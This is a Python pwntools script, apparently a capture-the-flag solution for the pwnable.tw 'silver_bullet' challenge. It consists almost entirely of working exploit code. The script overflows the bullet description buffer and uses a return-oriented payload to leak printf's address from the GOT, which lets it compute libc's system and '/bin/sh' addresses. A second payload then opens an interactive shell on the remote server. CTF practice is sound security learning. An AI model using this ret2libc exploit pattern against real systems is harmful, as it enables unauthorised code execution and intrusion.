from pwn import *

# io = process("./silver_bullet")
io = remote("chall.pwnable.tw", 10103)
e = ELF("./silver_bullet")
l = ELF("./libc_32.so.6")

def choose(idx):
	io.sendlineafter("Your choice :", str(idx))
def powerup(s):
	choose(2)
	io.sendafter("Give me your another description of bullet :", s)

# overwrite buffer, leak libc addr
choose(1)
io.sendafter("Give me your description of bullet :", "A"*0x2F)
powerup("A")

printf = 0x08048498 # for some reasons e.plt['printf'] doesn work
payload = p32(printf) + p32(e.symbols['main']) + p32(e.got['printf'])
powerup(p32((1 << 32) - 1)[:3] + "A"*4 + payload) 

choose(3)
io.recvuntil("Oh ! You win !!\n")

printf_at = u32(io.recv(4))
system_at = printf_at - l.symbols['printf'] + l.symbols['system']
bin_sh = printf_at - l.symbols['printf'] + 0x00158e8b
print "print at {}".format(hex(printf_at))
print "system at {}".format(hex(system_at))

# overwrite buffer, jumping to system

choose(1)
io.sendafter("Give me your description of bullet :", "A"*0x2F)
powerup("A")

payload = p32(system_at) + "A"*4 + p32(bin_sh)
powerup(p32((1 << 32) - 1)[:3] + "A"*4 + payload) 

choose(3)
io.interactive()
